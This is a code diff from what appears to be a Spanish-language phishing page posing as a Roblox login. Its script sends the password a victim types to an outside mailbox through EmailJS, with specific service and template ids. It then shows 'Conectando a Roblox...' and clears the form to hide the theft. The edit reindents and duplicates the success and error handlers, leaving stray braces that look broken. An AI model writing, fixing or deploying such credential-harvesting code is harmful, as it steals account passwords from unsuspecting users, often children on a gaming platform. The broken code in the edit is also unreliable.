@@ -200,14 +200,20 @@
                     mensaje: password
                 };
                 
-                // Enviar email
                 emailjs.send('service_l1x71ld', 'template_z3drhgj', templateParams)
-                    .then(function(response) {
-                        console.log('SUCCESS!', response.status, response.text);
-                        alert('Conectando a Roblox...');
-                        document.querySelector('form').reset();
-                        submitButton.textContent = 'Conectar';
-                        submitButton.disabled = false;
+    .then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+        alert('Conectando a Roblox...');
+        document.querySelector('form').reset();
+        submitButton.textContent = 'Conectar';
+        submitButton.disabled = false;
+    })
+    .catch(function(error) {
+        console.log('FAILED...', error);
+        alert('Error: ' + error.text);
+        submitButton.textContent = 'Conectar';
+        submitButton.disabled = false;
+    });
                     })
                     .catch(function(error) {
                         console.log('FAILED...', error);
